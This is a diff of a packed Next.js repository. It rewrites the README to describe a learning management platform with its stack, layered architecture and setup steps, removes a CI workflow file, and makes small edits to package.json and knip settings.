+66:           node-version: 22
+67:           cache: pnpm
+68:       - name: Install dependencies
+69:         run: pnpm install --frozen-lockfile
+70:       - name: Generate Prisma client
+71:         run: pnpm prisma:generate
+72:       - name: Build
+73:         run: pnpm build
+74:         env:
+75:           DATABASE_URL: "postgresql://placeholder:placeholder@localhost:5432/placeholder"
 `````
 
 ## File: docs/DEVELOPMENT.md
@@ -29871,244 +29107,182 @@ tsconfig.json
 14:     "src/repositories/*.ts",
 15:     "src/services/*.ts"
 16:   ],
-17:   "ignoreDependencies": ["ts-node"]
+17:   "ignoreDependencies": ["ts-node", "clsx", "tailwind-merge"]
 18: }
 `````
 
 ## File: README.md
 `````markdown
-  1: # Next.js Modern Starter
+  1: # Next.js LMS Platform
   2: 
-  3: > A production-ready Next.js starter with TypeScript, Prisma, Tailwind CSS v4, and shadcn/ui.
+  3: > A production-grade Learning Management System (LMS) built with Next.js 16 (App Router), React 19, TypeScript, Tailwind CSS v4, shadcn/ui, Prisma ORM, Neon PostgreSQL, and Better Auth.
   4: 
-  5: ## Quick Start
+  5: ---
   6: 
-  7: ```bash
-  8: # Install dependencies
-  9: pnpm install
- 10: 
- 11: # Set up environment variables
- 12: cp .env.example .env
- 13: 
- 14: # Generate Prisma client
- 15: pnpm db:generate
- 16: 
- 17: # Start development server
- 18: pnpm dev
- 19: ```
- 20: 
- 21: Visit `http://localhost:3000`
- 22: 
- 23: ## Tech Stack
- 24: 
- 25: | Category   | Technology        |
- 26: | ---------- | ----------------- |
- 27: | Framework  | Next.js 16        |
- 28: | Language   | TypeScript        |
- 29: | UI         | React 19          |
- 30: | Styling    | Tailwind CSS v4   |
- 31: | Components | shadcn/ui         |
- 32: | Database   | PostgreSQL (Neon) |
- 33: | ORM        | Prisma            |
- 34: | Auth       | Better Auth       |
- 35: | Monitoring | Sentry            |
- 36: | Validation | Zod               |
- 37: | Forms      | React Hook Form   |
- 38: | Testing    | Jest              |
- 39: | Linting    | ESLint + Prettier |
- 40: 
- 41: ## Project Structure
- 42: 
- 43: ```
- 44: src/
- 45: ├── app/              # Next.js App Router pages
- 46: ├── components/       # Reusable UI components
- 47: │   ├── ui/          # shadcn/ui components
- 48: │   ├── layout/      # Layout components
- 49: │   └── shared/      # Shared components
- 50: ├── lib/             # Utilities and configurations
- 51: ├── actions/         # Server Actions
- 52: ├── services/        # Business logic
- 53: ├── repositories/    # Data access layer
- 54: └── providers/       # React Context providers
- 55: 
- 56: prisma/
- 57: └── schema.prisma    # Database schema
- 58: 
- 59: docs/                # Project documentation
- 60: ```
+  7: ## Key Features
+  8: 
+  9: - **Role-Based Access Control (RBAC):** Multi-tier authorization supporting Students, Instructors, and Administrators via Better Auth with session management and route guards.
+ 10: - **Course Catalog & Discovery:** Server-side search, category and proficiency level filtering, sorting, and bounded pagination with automatic enrollment state decoration.
+ 11: - **Student Learning Player:** Interactive course player featuring dynamic curriculum sidebar navigation, video embeds (YouTube, Vimeo, Loom), server-sanitized markdown reader, downloadable resources, and granular per-lesson progress completion tracking.
+ 12: - **Instructor Course Management:** Dedicated instructor authoring workspace for course creation, curriculum organization (modules and lessons), atomic two-phase curriculum reordering, rich markdown editor with live sanitized preview, and publishing state machines.
+ 13: - **User Profiles:** Self-service profile management with bio, headline, website, and avatar customization.
+ 14: - **Enterprise Security & Concurrency:** IDOR protection on all resources, server-side XSS sanitization (`sanitize-html` and `marked`), parent course row locking (`SELECT ... FOR UPDATE`), and atomic database transactions.
+ 15: 
+ 16: ---
+ 17: 
+ 18: ## Tech Stack
+ 19: 
+ 20: | Category | Technology |
+ 21: | -------- | ---------- |
+ 22: | **Framework** | Next.js 16 (App Router) |
+ 23: | **Language** | TypeScript 5.9 |
+ 24: | **UI Library** | React 19 |
+ 25: | **Styling** | Tailwind CSS v4 + tw-animate-css |
+ 26: | **Components** | shadcn/ui (base-nova) + Lucide Icons |
+ 27: | **Database** | PostgreSQL (Neon serverless) |
+ 28: | **ORM** | Prisma 7.10 |
+ 29: | **Authentication** | Better Auth 1.7 |
+ 30: | **Validation** | Zod |
+ 31: | **Forms** | React Hook Form + `@hookform/resolvers` |
+ 32: | **Testing** | Jest 30 + React Testing Library |
+ 33: | **Tooling & Linter** | Biome 2.5 + Knip |
+ 34: | **Monitoring** | Sentry (`@sentry/nextjs`) |
+ 35: 
+ 36: ---
+ 37: 
+ 38: ## Architecture
+ 39: 
+ 40: This project strictly adheres to a **5-layer architecture** with downward-only dependency flow:
+ 41: 
+ 42: ```
+ 43: UI Layer (Server & Client Components)
+ 44:   ↓
+ 45: Actions / Routes (@/actions/*, @/app/api/*)
+ 46:   ↓
+ 47: Domain Services (@/services/*)
+ 48:   ↓
+ 49: Repositories (@/repositories/*)
+ 50:   ↓
+ 51: Database (Prisma + Neon PostgreSQL)
+ 52: ```
+ 53: 
+ 54: - **UI:** Pure presentation. Never queries database or repositories directly. Interactive elements are isolated client leaves (`"use client"`).
+ 55: - **Actions / Routes:** Input validation via Zod schemas and session/role guards. Standardized `ActionResult<T>` responses.
+ 56: - **Domain Services:** Centralized business logic, transactions, state machines, and 4-tier authorization.
+ 57: - **Repositories:** Clean data access, queries, and atomic database mutations.
+ 58: - **Database:** Managed via Prisma schemas with indexes supporting foreign keys and query paths.
+ 59: 
+ 60: ---
  61: 
- 62: ## Architecture
+ 62: ## Quick Start
  63: 
- 64: This project follows a **layered architecture** to separate concerns:
+ 64: ### 1. Clone & Install Dependencies
  65: 
- 66: ```
- 67: UI Layer (React Components)
- 68:          ↓
- 69: Actions/Routes (Server Actions, API Routes)
- 70:          ↓
- 71: Services (Business Logic)
- 72:          ↓
- 73: Repositories (Data Access)
- 74:          ↓
- 75: Database (Prisma + PostgreSQL)
- 76: ```
- 77: 
- 78: **Key Principles:**
+ 66: ```bash
+ 67: git clone <repository-url>
+ 68: cd nextjs
+ 69: pnpm install
+ 70: ```
+ 71: 
+ 72: ### 2. Configure Environment Variables
+ 73: 
+ 74: Create `.env` based on `.env.example`:
+ 75: 
+ 76: ```bash
+ 77: cp .env.example .env
+ 78: ```
  79: 
- 80: - Business logic lives in **Services**, never in UI components
- 81: - Database access happens only through **Repositories**
- 82: - Prefer **Server Components** by default
- 83: - Use **Client Components** only when needed (state, events, browser APIs)
- 84: 
- 85: ## Available Scripts
- 86: 
- 87: ```bash
- 88: pnpm dev          # Start development server
- 89: pnpm build        # Build for production
- 90: pnpm start        # Start production server
- 91: pnpm lint         # Run Biome linter
- 92: pnpm format       # Format code with Biome
- 93: pnpm typecheck    # Run TypeScript type checking
- 94: pnpm test         # Run Jest tests
- 95: ```
+ 80: Ensure the following variables are configured:
+ 81: 
+ 82: ```env
+ 83: # Database (Neon PostgreSQL)
+ 84: DATABASE_URL="postgresql://user:password@endpoint.neon.tech/neondb?sslmode=require"
+ 85: 
+ 86: # Better Auth Configuration
+ 87: BETTER_AUTH_SECRET="your-secure-random-secret-key-at-least-32-chars"
+ 88: BETTER_AUTH_URL="http://localhost:3000"
+ 89: NEXT_PUBLIC_APP_URL="http://localhost:3000"
+ 90: 
+ 91: # Sentry (Optional for local dev)
+ 92: NEXT_PUBLIC_SENTRY_DSN=""
+ 93: ```
+ 94: 
+ 95: ### 3. Database Migration & Client Generation
  96: 
- 97: ## Documentation
- 98: 
- 99: - **[Master Index](docs/INDEX.md)** - Canonical navigation hub for documentation
-100: - **[Architecture](docs/Architecture.md)** - Detailed 5-layer architecture guide
-101: - **[Development Guide](docs/DEVELOPMENT.md)** - Development workflows and setup
-102: - **[API Documentation](docs/API/)** - API references
-103: - **[ADRs (Decisions)](docs/decisions/)** - Architecture Decision Records
-104: 
-105: ## Project Goals
-106: 
-107: - Clean, maintainable architecture
-108: - Type-safe code throughout
-109: - Excellent developer experience
-110: - AI-friendly codebase
-111: - Performance-optimized
-112: - Accessible by default
+ 97: ```bash
+ 98: pnpm db:generate
+ 99: pnpm db:push
+100: # or run migrations:
+101: # pnpm db:migrate
+102: ```
+103: 
+104: ### 4. Run Development Server
+105: 
+106: ```bash
+107: pnpm dev
+108: ```
+109: 
+110: Open [http://localhost:3000](http://localhost:3000) in your browser.
+111: 
+112: ---
 113: 
-114: ## Git Workflow
+114: ## Available Scripts
 115: 
-116: This project uses a trunk-based workflow:
-117: 
-118: - **`master`** - Production/stable branch (protected)
-119: - **`dev`** - Development/integration branch (protected)
-120: - **`dev/<feature>`** - Feature branches
-121: 
-122: ### Quick Start
-123: 
-124: ```bash
-125: # Start new feature
-126: git checkout dev && git pull && git checkout -b dev/my-feature
-127: 
-128: # Make changes and commit
-129: git add .
-130: git commit -m "feat(scope): description"
+116: | Command | Description |
+117: | ------- | ----------- |
+118: | `pnpm dev` | Start Next.js development server |
+119: | `pnpm build` | Create production build |
+120: | `pnpm start` | Start production server |
+121: | `pnpm test` | Run complete Jest test suite (unit, integration, security) |
+122: | `pnpm typecheck` | Run TypeScript compiler check without emitting files |
+123: | `pnpm lint` | Run Biome linter across codebase |
+124: | `pnpm format` | Format files using Biome |
+125: | `pnpm check` | Run full quality gate: Biome check, typecheck, and Knip |
+126: | `pnpm db:generate` | Regenerate Prisma Client |
+127: | `pnpm db:push` | Sync Prisma schema with Neon database |
+128: | `pnpm db:studio` | Open Prisma Studio database viewer |
+129: 
+130: ---
 131: 
-132: # Verify before PR
-133: pnpm lint && pnpm typecheck && pnpm test 
-134: 
-135: # Push and create PR to dev
-136: git push origin dev/my-feature
-137: ```
-138: 
-139: See **[Git Workflow Guide](docs/Development/Git.md)** for complete branching, release, and versioning guidelines.
-140: 
-141: ## Contributing
-142: 
-143: 1. Create feature branches from `dev` (never from `master`)
-144: 2. Follow Conventional Commits: `type(scope): description`
-145: 3. Ensure all checks pass: lint, typecheck, tests, build
-146: 4. Create PR targeting `dev` branch
-147: 5. Delete feature branch after merge
-148: 
-149: See [Development Guide](docs/DEVELOPMENT.md) for coding standards.
-150: 
-151: ## License
-152: 
-153: MIT
-`````
-
-## File: .github/workflows/ci.yml
-`````yaml
- 1: name: CI
- 2: on:
- 3:   push:
- 4:     branches: [master, dev]
- 5:   pull_request:
- 6:     branches: [master, dev]
- 7: env:
- 8:   DATABASE_URL: "postgresql://placeholder:placeholder@localhost:5432/placeholder"
- 9:   DIRECT_URL: "postgresql://placeholder:placeholder@localhost:5432/placeholder"
-10:   BETTER_AUTH_SECRET: "placeholderplaceholderplaceholderplaceholder"
-11:   BETTER_AUTH_URL: "http://localhost:3000"
-12: jobs:
-13:   quality:
-14:     name: Quality Checks
-15:     runs-on: ubuntu-latest
-16:     steps:
-17:       - name: Checkout
-18:         uses: actions/checkout@v4
-19:       - name: Setup pnpm
-20:         uses: pnpm/action-setup@v4
-21:       - name: Setup Node.js
-22:         uses: actions/setup-node@v4
-23:         with:
-24:           node-version: 22
-25:           cache: pnpm
-26:       - name: Install dependencies
-27:         run: pnpm install --frozen-lockfile
-28:       - name: Generate Prisma client
-29:         run: pnpm prisma:generate
-30:       - name: TypeScript check
-31:         run: pnpm tsc --noEmit
-32:       - name: ESLint check
-33:         run: pnpm lint
-34:       - name: Dead code check
-35:         run: pnpm knip
-36:   test:
-37:     name: Tests
-38:     runs-on: ubuntu-latest
-39:     steps:
-40:       - name: Checkout
-41:         uses: actions/checkout@v4
-42:       - name: Setup pnpm
-43:         uses: pnpm/action-setup@v4
-44:       - name: Setup Node.js
-45:         uses: actions/setup-node@v4
-46:         with:
-47:           node-version: 22
-48:           cache: pnpm
-49:       - name: Install dependencies
-50:         run: pnpm install --frozen-lockfile
-51:       - name: Generate Prisma client
-52:         run: pnpm prisma:generate
-53:       - name: Run tests
-54:         run: pnpm test
-55:   build:
-56:     name: Build
-57:     runs-on: ubuntu-latest
-58:     steps:
-59:       - name: Checkout
-60:         uses: actions/checkout@v4
-61:       - name: Setup pnpm
-62:         uses: pnpm/action-setup@v4
-63:       - name: Setup Node.js
-64:         uses: actions/setup-node@v4
-65:         with:
-66:           node-version: 22
-67:           cache: pnpm
-68:       - name: Install dependencies
-69:         run: pnpm install --frozen-lockfile
-70:       - name: Generate Prisma client
-71:         run: pnpm prisma:generate
-72:       - name: Build
-73:         run: pnpm build
-74:         env:
-75:           DATABASE_URL: "postgresql://placeholder:placeholder@localhost:5432/placeholder"
+132: ## Project Structure
+133: 
+134: ```
+135: src/
+136: ├── actions/             # Server Actions (Zod parsing, auth guards, ActionResult)
+137: ├── app/                 # Next.js App Router (pages, layouts, route handlers)
+138: │   ├── (auth)/          # Authentication routes (/sign-in, /sign-up)
+139: │   ├── (dashboard)/     # Protected instructor & user dashboards
+140: │   ├── (marketing)/     # Public landing & static pages
+141: │   ├── courses/         # Course catalog, syllabus, and learning player
+142: │   └── api/             # API route handlers (Better Auth, webhooks)
+143: ├── components/
+144: │   ├── features/        # Domain-scoped UI components (auth, catalog, player, etc.)
+145: │   ├── global/          # Global layout, header, footer, theme providers
+146: │   └── ui/              # shadcn/ui design primitives (button, card, dialog, etc.)
+147: ├── lib/                 # Core utilities, errors, validators, auth config
+148: ├── providers/           # React context providers (Theme, Auth)
+149: ├── repositories/        # Concrete data access layer (Prisma models)
+150: ├── services/            # Domain business logic & transaction boundaries
+151: └── __tests__/           # Security penetration tests (IDOR, XSS)
+152: ```
+153: 
+154: ---
+155: 
+156: ## Documentation Links
+157: 
+158: - **[Master Index](docs/INDEX.md)** — Canonical project documentation hub
+159: - **[Architecture Guide](docs/Architecture.md)** — Detailed 5-layer boundaries and concurrency patterns
+160: - **[Domain Entities Reference](docs/reference/Entities.md)** — Comprehensive entity and relation definitions
+161: - **[ADR 001: Layered Architecture](docs/decisions/001-use-layered-architecture.md)**
+162: - **[ADR 002: Neon with Prisma](docs/decisions/002-use-neon-with-prisma.md)**
+163: - **[ADR 003: shadcn/ui Component Strategy](docs/decisions/003-use-shadcn-ui.md)**
+164: - **[ADR 004: LMS Domain Model](docs/decisions/004-lms-domain-model.md)**
+165: 
+166: ---
+167: 
+168: ## License
+169: 
+170: MIT
 `````
 
 ## File: package.json
@@ -30162,48 +29336,49 @@ tsconfig.json
 47:     "better-auth": "^1.7.3",
 48:     "class-variance-authority": "^0.7.1",
 49:     "clsx": "^2.1.1",
-50:     "dotenv": "^17.4.2",
-51:     "framer-motion": "^13.2.0",
-52:     "goey-toast": "^0.5.0",
-53:     "lucide-react": "^1.41.0",
-54:     "marked": "^18.0.11",
-55:     "next": "16.3.4",
-56:     "next-themes": "^0.4.6",
-57:     "react": "19.2.8",
-58:     "react-dom": "19.2.8",
-59:     "react-hook-form": "^7.87.0",
-60:     "sanitize-html": "^2.17.7",
-61:     "shadcn": "^4.21.0",
-62:     "tailwind-merge": "^3.6.0",
-63:     "tw-animate-css": "^1.4.0",
-64:     "ws": "^8.21.3",
-65:     "zod": "^4.5.4"
-66:   },
-67:   "devDependencies": {
-68:     "@biomejs/biome": "2.5.12",
-69:     "@tailwindcss/postcss": "^4.3.3",
-70:     "@testing-library/dom": "^10.4.1",
-71:     "@testing-library/jest-dom": "^7.0.1",
-72:     "@testing-library/react": "^16.3.3",
-73:     "@types/jest": "^30.0.0",
-74:     "@types/node": "^26.4.1",
-75:     "@types/react": "^19.2.18",
-76:     "@types/react-dom": "^19.2.7",
-77:     "@types/sanitize-html": "^2.16.1",
-78:     "@types/ws": "^8.18.1",
-79:     "husky": "^9.1.7",
-80:     "jest": "^30.5.1",
-81:     "jest-environment-jsdom": "^30.5.1",
-82:     "knip": "^6.34.0",
-83:     "lint-staged": "^17.5.0",
-84:     "prisma": "^7.10.0",
-85:     "tailwindcss": "^4.3.3",
-86:     "ts-node": "^10.9.2",
-87:     "tsx": "^4.23.1",
-88:     "typescript": "^5.9.3"
-89:   },
-90:   "prisma": {
-91:     "seed": "tsx prisma/seed.ts"
-92:   }
-93: }
+50:     "cn": "^0.3.0",
+51:     "dotenv": "^17.4.2",
+52:     "framer-motion": "^13.2.0",
+53:     "goey-toast": "^0.5.0",
+54:     "lucide-react": "^1.41.0",
+55:     "marked": "^18.0.11",
+56:     "next": "16.3.4",
+57:     "next-themes": "^0.4.6",
+58:     "react": "19.2.8",
+59:     "react-dom": "19.2.8",
+60:     "react-hook-form": "^7.87.0",
+61:     "sanitize-html": "^2.17.7",
+62:     "shadcn": "^4.21.0",
+63:     "tailwind-merge": "^3.6.0",
+64:     "tw-animate-css": "^1.4.0",
+65:     "ws": "^8.21.3",
+66:     "zod": "^4.5.4"
+67:   },
+68:   "devDependencies": {
+69:     "@biomejs/biome": "2.5.12",
+70:     "@tailwindcss/postcss": "^4.3.3",
+71:     "@testing-library/dom": "^10.4.1",
+72:     "@testing-library/jest-dom": "^7.0.1",
+73:     "@testing-library/react": "^16.3.3",
+74:     "@types/jest": "^30.0.0",
+75:     "@types/node": "^26.4.1",
+76:     "@types/react": "^19.2.18",
+77:     "@types/react-dom": "^19.2.7",
+78:     "@types/sanitize-html": "^2.16.1",
+79:     "@types/ws": "^8.18.1",
+80:     "husky": "^9.1.7",
+81:     "jest": "^30.5.1",
+82:     "jest-environment-jsdom": "^30.5.1",
+83:     "knip": "^6.34.0",
+84:     "lint-staged": "^17.5.0",
+85:     "prisma": "^7.10.0",
+86:     "tailwindcss": "^4.3.3",
+87:     "ts-node": "^10.9.2",
+88:     "tsx": "^4.23.1",
+89:     "typescript": "^5.9.3"
+90:   },
+91:   "prisma": {
+92:     "seed": "tsx prisma/seed.ts"
+93:   }
+94: }
 `````
